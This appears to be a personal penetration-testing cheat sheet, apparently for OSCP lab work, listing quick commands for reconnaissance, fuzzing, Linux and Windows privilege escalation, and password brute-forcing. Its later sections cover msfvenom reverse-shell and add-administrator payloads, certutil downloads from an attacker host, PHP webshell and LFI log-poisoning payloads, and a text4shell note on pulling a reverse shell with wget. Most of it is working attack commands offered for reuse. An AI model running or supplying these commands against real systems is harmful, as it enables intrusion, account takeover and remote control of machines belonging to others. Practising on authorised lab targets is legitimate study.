# Quickfire Bang Bang

`THESE` are all of `MY` quickfire **CMDS**!

## To-Do
```bash
find better cmds and methods to find kernel exploits.
```

## Discovery

### Nmap

```bash
fscan $ip
sudo nmap -sV -sC -sU -p 69,111,161 $ip
```

## Web

### Subdomain fuzzing
```bash
ffuf -w ~/Seclists/Discovery/Web-Content/raft-large-directories.txt -u https://$ip/FUZZ -fc 404 -o ffufdirectories
ffuf -w ~/Seclists/Discovery/Web-Content/raft-large-words.txt -u https://$ip/FUZZ -fc 404 -o ffufwords
ffuf -w ~/Seclists/Discovery/Web-Content/raft-large-files.txt -u https://$ip/FUZZ -fc 404 -o ffuffiles
ffuf -w ~/Seclists/Discovery/Web-Content/raft-large-words.txt -u https://$ip/FUZZ -fc 404 -e php, html, csv
```

### VHost fuzzing
```bash
ffuf -u https://$ip -H "Host: FUZZ.$ip" -w ~/SecLists/Discovery/DNS/subdomains-top1million-20000.txt  -ac
```

### Parameter fuzzing
```bash
ffuf -w ~/Seclists -u https://$ip/$file.php?FUZZ=a -fs 4242
ffuf -w /Seclists -u https://$ip/$file.php?$param=FUZZ -fc 401
```

### Nikto
```bash
~/binaries/nikto.pl -h http://$ip -output nikto
```

### WPscan
```bash
wpscan --url http://$ip | tee wpscanshallow
wpscan --url http://$ip -e u,vp,vt | tee wpscandeep
```

## Privilege Escalation

### Linux
```bash
id
sudo -l
crontab -l
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
grep "CRON" /var/log/syslog
ls -laht /etc/cron*
/usr/sbin/getcap -r / 2>/dev/null
ps aux
netstat -tulnp
ss -anp
ls -a /etc/passwd

\\ Look through root and all user directories
\\ Look in /tmp/ – /dev/shm – /var/tmp/ – /opt/ – /srv/ – /var/mail/ – /var/spool/mail/
\\ Look through /etc for anything that isnt root root, root cups, or root shadow
\\ Run linpeas if you must

dpkg -l
lsblk ; mount
lsmod ; /sbin/modinfo libata
uname -r ; uname -a
cat /proc/version
cat /etc/*release
```

### Windows
```bash
whoami /priv
Get-Content (Get-PSReadLineOption).HistorySavePath
certutil.exe -urlcache -split -f "http://$myip:8000/PowerUp.ps1" pu.ps1
powershell -ep bypass
Import-Module .\pu.ps1
Invoke-AllChecks
Invoke-ServiceAbuse -Name "VulnerableServiceName" -Command "net localgroup Administrators compromised_user /add"
Invoke-ServiceAbuse -Name "VulnerableServiceName" -Command "C:\Windows\Temp\reverse_shell.exe"
netstat -ano
wmic service get name,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\"
schtasks /query /fo LIST /v | findstr /i /c:"TaskName:" /c:"Task To Run:"
schtasks /run /tn "path\to\taskname"
"HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select Displayname
Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
```

## Password Bruting

### HTTP Post bruting
```bash
ffuf -w $user:USER -w /usr/share/wordlists/rockyou.txt:PASS \ 
  -X POST \ 
  -d "username=USER&password=PASS" \ 
  -H "Content-Type: application/x-www-form-urlencoded" \ 
  -u http://<TARGET_IP>/login.php \ 
  -fr “Invalid Request” 
```

### HTTP Get bruting
```bash
ffuf -w $user:USER -w /usr/share/wordlists/rockyou.txt:PASS \ 
  -u "http://<TARGET_IP>/login?user=USER&pass=PASS" \ 
  -fw 45
```

### SSH & FTP bruting
```bash
hydra -L $user -P ~/usr/share/wordlists/rockyou.txt $ip ssh
hydra -L $user -P ~/usr/share/wordlists/rockyou.txt $ip ftp
```

## Misc

### RCE & LPE binary creation
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f raw > shell.php
msfvenom -p windows/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe > shell.exe
msfvenom -p windows/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f dll > shell.dll
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe > addadmin.exe
msfvenom -p windows/adduser USER=hacker PASS=ComplexP@ssw0rd! -f exe > adduser.exe
```
###  LFI
```bash

// Only relevant if site uses PHP

// Try data wrapper

echo -n '<?php echo system($_GET["cmd"]);?>' | base64
curl "http://$ip/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"

// If site allows for directory traversal try log poisoning with following cmd. And append the URL with &cmd=ls

<?php echo system($_GET['cmd']); ?>

// Then

curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"

// If contents of .php page are missing, use filter wrapper.

curl http://$ip/index.php?$vulnpageparam=php://filter/convert.base64-encode/resource=$vulnpage.php
echo "b64encodedoutput" | base64 -d

```

### File uploads
```bash
// If PHP is used try uploading a .PHP, .pHP, .phP, .Php, pHp, phps, php7.

// Also try writing over ssh keys in user and root dirs.
```
### API Abuse
```bash

```
### Working within restricted shells or with restricted command execution
```bash

```

## Misc notes

### text4shell

During an OSCP lab I came across an Ubuntu box running Apache Tomcat using the Java Springboot Framework. I realized pretty quickly during enum that it was vulnerable to the `text4shell` exploit. It is essentially blind os cmd injection via crafted GET request. A problem arose when I attempted to drop my revshell one liner into the `exec()` java function. It didn't work despite url encoding the entire string. So I tried a simpler string to test for code exec *that claude gave me* and my http server got a request! So what was going on???? What was happening was I was inputting `:` and `/` chars into my string which was fucking with the string interpolation. So when I tried to run `nc 192.168.45.191:80` **it would cut the string where it saw the** `:`. So the string would look like `{nc, 192.168.45.191, 80}` which doesnt work in nc. I had to run a wget to my http server holding a rev shell serving over standard port 80, and then run the revshell in a seperate GET request to obtain a shell.

**Learning moment**
```txt
Don't assume dropping shellcode into an exec() function will just implicitly run. Especially in different web frameworks. You must think about the use of chars like :, /, |, etc and how they will be handled.
```
